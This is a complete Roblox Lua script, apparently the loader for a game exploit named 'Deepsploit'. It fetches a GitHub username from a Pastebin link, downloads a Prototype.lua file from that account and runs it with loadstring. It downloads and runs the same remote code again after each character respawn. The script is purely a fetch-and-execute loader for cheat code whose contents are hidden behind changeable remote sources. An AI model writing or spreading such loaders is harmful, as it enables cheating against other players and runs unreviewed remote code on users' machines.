local GitHubName = loadstring(game:HttpGet("https://pastebin.com/raw/sS94Uwjg"))()

loadstring(game:HttpGet("https://raw.githubusercontent.com/" .. GitHubName .. "/Deepsploit/main/Prototype.lua"))()

game.Players.LocalPlayer.CharacterAdded:Connect(function()
    wait(3)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/" .. GitHubName .. "/Deepsploit/main/Prototype.lua"))()
end)
